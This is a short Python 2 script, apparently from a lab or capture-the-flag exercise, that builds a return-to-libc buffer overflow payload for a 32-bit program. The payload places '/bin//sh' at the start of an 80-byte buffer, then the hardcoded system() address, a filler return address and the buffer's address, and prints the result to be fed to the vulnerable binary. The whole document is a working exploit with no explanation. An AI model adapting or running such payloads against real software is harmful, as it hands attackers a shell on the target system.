#!/usr/bin/python

length = 80 
shell = '/bin//sh\x00'
padding = 'a' * (length - len(shell))
#0xb7ecffb0
system_addr = '\xb0\xff\xec\xb7'

#0xbffffc5c
buffer_addr = '\x5c\xfc\xff\xbf'

payload = shell + padding + system_addr + '\x61\x61\x61\x61' + buffer_addr

print payload
